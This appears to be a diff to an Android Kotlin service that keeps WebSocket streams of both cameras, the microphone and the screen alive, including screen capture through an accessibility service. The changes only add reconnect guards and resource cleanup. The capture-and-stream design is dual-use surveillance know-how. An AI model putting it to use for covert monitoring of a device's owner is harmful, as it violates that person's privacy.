@@ -215,11 +215,11 @@ class StreamingService : Service() {
                 }
                 override fun onFailure(ws: WebSocket, t: Throwable, response: Response?) {
                     wsBack = null; updateNotification("Ошибка подключения")
-                    if (isRunning) Handler(Looper.getMainLooper()).postDelayed({ if (wsBack == null) connectCamWs() }, 5000)
+                    if (isRunning) Handler(Looper.getMainLooper()).postDelayed({ if (isRunning && wsBack == null) connectCamWs() }, 5000)
                 }
                 override fun onClosed(ws: WebSocket, code: Int, reason: String) {
                     wsBack = null
-                    if (isRunning) Handler(Looper.getMainLooper()).postDelayed({ if (wsBack == null) connectCamWs() }, 5000)
+                    if (isRunning) Handler(Looper.getMainLooper()).postDelayed({ if (isRunning && wsBack == null) connectCamWs() }, 5000)
                 }
             })
     }
@@ -241,11 +241,11 @@ class StreamingService : Service() {
                 }
                 override fun onFailure(ws: WebSocket, t: Throwable, response: Response?) {
                     wsFront = null
-                    if (isRunning) Handler(Looper.getMainLooper()).postDelayed({ if (wsFront == null) connectFrontCamWs() }, 5000)
+                    if (isRunning) Handler(Looper.getMainLooper()).postDelayed({ if (isRunning && wsFront == null) connectFrontCamWs() }, 5000)
                 }
                 override fun onClosed(ws: WebSocket, code: Int, reason: String) {
                     wsFront = null
-                    if (isRunning) Handler(Looper.getMainLooper()).postDelayed({ if (wsFront == null) connectFrontCamWs() }, 5000)
+                    if (isRunning) Handler(Looper.getMainLooper()).postDelayed({ if (isRunning && wsFront == null) connectFrontCamWs() }, 5000)
                 }
             })
     }
@@ -261,11 +261,11 @@ class StreamingService : Service() {
                 override fun onOpen(ws: WebSocket, response: Response) { wsAudio = ws; startAudioCapture() }
                 override fun onFailure(ws: WebSocket, t: Throwable, response: Response?) {
                     wsAudio = null
-                    if (isRunning) Handler(Looper.getMainLooper()).postDelayed({ if (wsAudio == null) connectAudioWs() }, 5000)
+                    if (isRunning) Handler(Looper.getMainLooper()).postDelayed({ if (isRunning && wsAudio == null) connectAudioWs() }, 5000)
                 }
                 override fun onClosed(ws: WebSocket, code: Int, reason: String) {
                     wsAudio = null; stopAudioCapture()
-                    if (isRunning) Handler(Looper.getMainLooper()).postDelayed({ if (wsAudio == null) connectAudioWs() }, 5000)
+                    if (isRunning) Handler(Looper.getMainLooper()).postDelayed({ if (isRunning && wsAudio == null) connectAudioWs() }, 5000)
                 }
             })
     }
@@ -311,12 +311,12 @@ class StreamingService : Service() {
                 override fun onFailure(ws: WebSocket, t: Throwable, response: Response?) {
                     wsScreen = null; releaseVirtualDisplay()
                     if (isRunning && mediaProjection != null)
-                        Handler(Looper.getMainLooper()).postDelayed({ if (wsScreen == null) connectScreenWs() }, 5000)
+                        Handler(Looper.getMainLooper()).postDelayed({ if (isRunning && wsScreen == null && mediaProjection != null) connectScreenWs() }, 5000)
                 }
                 override fun onClosed(ws: WebSocket, code: Int, reason: String) {
                     wsScreen = null; releaseVirtualDisplay()
                     if (isRunning && mediaProjection != null)
-                        Handler(Looper.getMainLooper()).postDelayed({ if (wsScreen == null) connectScreenWs() }, 5000)
+                        Handler(Looper.getMainLooper()).postDelayed({ if (isRunning && wsScreen == null && mediaProjection != null) connectScreenWs() }, 5000)
                 }
             })
     }
@@ -355,8 +355,10 @@ class StreamingService : Service() {
                 ws.send(out.toByteArray().toByteString())
             } finally { img.close() }
         }, handler)
-        virtualDisplay = mp.createVirtualDisplay("arp_screen", w, h, dpi,
-            DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR, reader.surface, null, null)
+        try {
+            virtualDisplay = mp.createVirtualDisplay("arp_screen", w, h, dpi,
+                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR, reader.surface, null, null)
+        } catch (_: Exception) { releaseVirtualDisplay() }
     }
 
     private fun releaseVirtualDisplay() {
@@ -383,14 +385,14 @@ class StreamingService : Service() {
                     wsScreen = null; stopAccessibilityCapture()
                     if (isRunning && ControlService.instance != null)
                         accessibilityHandler.postDelayed({
-                            if (wsScreen == null) connectScreenWsAccessibility()
+                            if (isRunning && wsScreen == null && ControlService.instance != null) connectScreenWsAccessibility()
                         }, 5000)
                 }
                 override fun onClosed(ws: WebSocket, code: Int, reason: String) {
                     wsScreen = null; stopAccessibilityCapture()
                     if (isRunning && ControlService.instance != null)
                         accessibilityHandler.postDelayed({
-                            if (wsScreen == null) connectScreenWsAccessibility()
+                            if (isRunning && wsScreen == null && ControlService.instance != null) connectScreenWsAccessibility()
                         }, 5000)
                 }
             })
@@ -429,13 +431,18 @@ class StreamingService : Service() {
                 try {
                     val bmp = hw.copy(Bitmap.Config.ARGB_8888, false)
                     hw.recycle()
-                    val out = ByteArrayOutputStream()
-                    bmp.compress(Bitmap.CompressFormat.JPEG, screenQuality, out)
-                    bmp.recycle()
-                    wsScreen?.send(out.toByteArray().toByteString())
-                } catch (_: Exception) { try { hw.recycle() } catch (_: Exception) {} }
+                    try {
+                        val out = ByteArrayOutputStream()
+                        bmp.compress(Bitmap.CompressFormat.JPEG, screenQuality, out)
+                        wsScreen?.send(out.toByteArray().toByteString())
+                    } finally {
+                        bmp.recycle()
+                    }
+                } catch (_: Exception) {
+                    if (!hw.isRecycled) hw.recycle()
+                }
             } else {
-                try { hw?.recycle() } catch (_: Exception) {}
+                hw?.recycle()
             }
             if (accessibilityCaptureRunning) accessibilityHandler.postDelayed({ doCapture() }, 80)
         }
@@ -486,12 +493,12 @@ class StreamingService : Service() {
                 override fun onFailure(ws: WebSocket, t: Throwable, response: Response?) {
                     unregisterPhoneViewer(ws)
                     if (ws == wsPhone) wsPhone = null
-                    if (isRunning) Handler(Looper.getMainLooper()).postDelayed({ if (wsPhone == null) connectPhoneWs() }, 5000)
+                    if (isRunning) Handler(Looper.getMainLooper()).postDelayed({ if (isRunning && wsPhone == null) connectPhoneWs() }, 5000)
                 }
                 override fun onClosed(ws: WebSocket, code: Int, reason: String) {
                     unregisterPhoneViewer(ws)
                     if (ws == wsPhone) wsPhone = null
-                    if (isRunning) Handler(Looper.getMainLooper()).postDelayed({ if (wsPhone == null) connectPhoneWs() }, 5000)
+                    if (isRunning) Handler(Looper.getMainLooper()).postDelayed({ if (isRunning && wsPhone == null) connectPhoneWs() }, 5000)
                 }
             })
     }
